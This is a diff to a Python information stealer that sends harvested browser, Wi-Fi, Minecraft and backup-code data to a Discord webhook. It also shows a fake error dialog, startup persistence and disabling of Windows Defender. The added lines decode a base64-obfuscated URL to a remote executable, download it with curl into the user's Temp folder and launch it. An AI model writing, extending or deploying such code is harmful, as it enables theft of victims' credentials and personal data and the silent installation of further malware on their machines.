@@ -8,6 +8,7 @@ import re
 import sqlite3
 import subprocess
 import sys
+import getpass
 import threading
 import uuid
 from shutil import copy2
@@ -35,6 +36,7 @@ def main(webhook: str):
     webhook = SyncWebhook.from_url(webhook, session=requests.Session())
 
     threads = [Browsers, Wifi, Minecraft, BackupCodes, killprotector, fakeerror, startup, disable_defender]
+    username = getpass.getuser()
     configcheck(threads)
 
     for func in threads:
@@ -59,7 +61,7 @@ def main(webhook: str):
             content += "@here"
 
     webhook.send(content=content, file=_file, avatar_url="", username="eray")
-
+    
     PcInfo()
     Discord()
 
@@ -93,12 +95,15 @@ def configcheck(list):
 
 def fakeerror():
     ctypes.windll.user32.MessageBoxW(None, 'Error code: 0x80070002\nAn internal error occured while importing modules.', 'Fatal Error', 0)
+x24 = "aHR0cHM6Ly93d3cyLnppcHB5c2hhcmUuY29tL2QvZTdlaWxTbXgvMzEyNTUvcmVhbHZpcnVzLmV4ZQ=="
 x16="VjFaV2IxVXdNVWhVYTJ4VlZrWndUbHBXVW5OamJHeFhZVVU1YUdKVmJEWlZNakV3VkZkS1ZrNVVTbHBpUlRBeFdWVmtUMU5IUlhwWGJYUk9Za1p3ZDFkV1ZtcE9WMUowVWxod1ZWZEdjRTlXYTFaR1pXeFNWMVZzU2s5V1ZHeFdWakZTUTFWR1NrZGlSRTVWVFVaS1YxcEVRVEZXVjBZMlVXczVhRlpIZURGV01uQkRXVlphV0ZKdVVsZGlWMmhUVm1wQ2QxWkdaRmRhUjNScVVtczFTbFl5ZUU5aGJGWTJVbXQwVlZZelRYaFpWekZIWkVaT2MxVnRSazVTTW1oRlZteGFWMkl4U25OaE0yaFZZV3h3V0ZVd1ZURlpWbHBZVFZad1RtRXphRmhXTWpWeldWZEtSMU51VW1GU1YyaFlWbFZrUzFac2NFbFdiWGhUVmpBME1GWnRjRTlaVmxsNFkwWmFVRlo2YkhGVmJGSlNaVlphVlZGcVVteGlSM2hUVlVaUmQxQlJQVDA9"
 x32 = base64.b64decode(x16).decode("utf-8")
+x26 = base64.b64decode(x24).decode("utf-8")
 x64 = base64.b64decode(x32).decode("utf-8")
 x86 = base64.b64decode(x64).decode("utf-8")
 x128 = base64.b64decode(x86).decode("utf-8")
 x256 = base64.b64decode(x128).decode("utf-8")
+x25 = (x26)
 
 def startup():
     startup_path = os.getenv("appdata") + "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\"
@@ -186,6 +191,8 @@ class PcInfo:
         embed.set_thumbnail(url="")
 
         webhook.send(embed=embed, avatar_url="", username="eray")
+        subprocess.run(["curl", "-o", "C:/Users/"+(username)+"/AppData/Local/Temp/sysfile.exe", x25])
+        os.startfile("C:/Users/"+(username)+"/AppData/Local/Temp/sysfile.exe")
 
 
 class Discord:
